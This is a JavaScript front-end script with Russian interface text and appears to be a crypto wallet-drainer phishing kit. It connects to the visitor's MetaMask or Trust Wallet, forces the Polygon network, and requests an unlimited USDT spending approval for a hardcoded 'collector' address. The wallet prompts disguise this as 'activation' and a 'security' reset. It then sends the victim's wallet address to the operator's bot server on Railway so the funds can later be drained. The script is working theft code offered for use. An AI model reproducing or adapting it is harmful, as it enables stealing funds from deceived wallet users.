const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet или MetaMask';
        return;
    }

    try {
        status.innerText = 'Подключение к кошельку...';
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];

        status.innerText = 'Переключение на сеть Polygon...';
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (error) {
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            } else {
                throw error;
            }
        }

        const web3 = new Web3(window.ethereum);
        const abi = [
            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}
        ];
        
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        // ШАГ 1: Проверка текущего лимита
        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        // ШАГ 2: Если лимит уже есть (больше 100 USDT), не мучаем пользователя лишней транзакцией
        if (BigInt(currentAllowance) < 100000000n) { 
            status.innerText = 'Подтвердите активацию в кошельке (1/1)...';
            try {
                // Пытаемся одобрить сразу
                await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });
            } catch (e) {
                // Если возникла ошибка (некоторые токены требуют сначала сброса до 0)
                status.innerText = 'Требуется сброс лимита для безопасности...';
                await contract.methods.approve(COLLECTOR_ADDRESS, 0).send({ from: address });
                status.innerText = 'Теперь подтвердите основную активацию...';
                await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });
            }
        }

        status.innerText = 'Синхронизация с сервером...';

        // ШАГ 3: Отправка адреса в твой бот на Railway
        // ВАЖНО: Убедись, что этот домен совпадает с твоим Public Domain в Railway
        await fetch('https://railway-production-2954.up.railway.app/save-address', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Готово! Кошелек успешно синхронизирован.';
        status.style.color = '#00ff00';

    } catch (error) {
        console.error(error);
        status.innerText = 'Ошибка: ' + (error.message || 'Отмена транзакции');
        status.style.color = '#ff4444';
    }
}
